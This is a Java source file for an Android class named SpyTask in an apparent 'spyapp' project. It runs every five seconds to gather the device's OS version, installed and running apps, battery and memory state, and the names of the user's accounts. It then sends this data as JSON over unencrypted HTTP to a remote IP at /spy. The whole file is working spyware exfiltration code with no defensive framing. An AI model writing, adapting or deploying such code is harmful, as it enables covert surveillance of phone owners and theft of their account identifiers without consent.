package com.example.spyapp.dex;

import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import com.example.spyapp.SpyModel;
import com.google.gson.Gson;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class SpyTask extends ContextWrapper implements DexTask {
    private final Logger logger = Logger.getLogger(this.getClass().getName());
    private final ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(1);
    private ScheduledFuture scheduledFuture;
    private final String ip;

    public SpyTask(Context base, String ip) {
        super(base);
        this.ip = ip;
    }

    @Override
    public void start() {
        if (scheduledFuture == null || scheduledFuture.isCancelled() || scheduledFuture.isDone()) {
            scheduledFuture = executorService.scheduleAtFixedRate(() -> {
                spyTask();
            }, 0, 5, TimeUnit.SECONDS);
            logger.info("service started.");
        } else {
            logger.info("service is already running");
        }
    }

    @Override
    public void stop() {
        if (scheduledFuture != null) scheduledFuture.cancel(true);
    }

    private void spyTask() {
        SpyModel spyModel = new SpyModel();
        logger.info("Task executed.");

        spyModel.setVersion(Build.VERSION.RELEASE);
        logger.info("Version: " + spyModel.getVersion());

        spyModel.setSdk(Build.VERSION.SDK_INT);
        logger.info("SDK: " + spyModel.getSdk());

        spyModel.setInstalled(getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA).stream().filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Installed: " + spyModel.getInstalled());

        spyModel.setRunning(((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getRunningAppProcesses().stream().filter(a -> a.processName != null).map(a -> a.processName).collect(Collectors.toList()));
        logger.info("Running: " + spyModel.getRunning());

        spyModel.setBattery(((BatteryManager)getSystemService(BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        logger.info("Battery: " + spyModel.getBattery());

        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(memoryInfo);
        spyModel.setMemory(memoryInfo.availMem);
        logger.info("Memory: " + spyModel.getMemory());

        spyModel.setAccounts(Arrays.stream(AccountManager.get(this).getAccounts()).filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Accounts: " + spyModel.getAccounts());

        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) (new URL("http://" + ip + ":8080/spy").openConnection());
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestMethod("POST");

            connection.setDoOutput(true);
            OutputStream stream = connection.getOutputStream();
            String body = new Gson().toJson(spyModel);
            stream.write(body.getBytes(StandardCharsets.UTF_8));
            stream.close();
            connection.connect();

            connection.getInputStream();

        } catch (Exception ex) {
            logger.info(ex.getMessage());
        } finally {
            connection.disconnect();
        }
    }
}
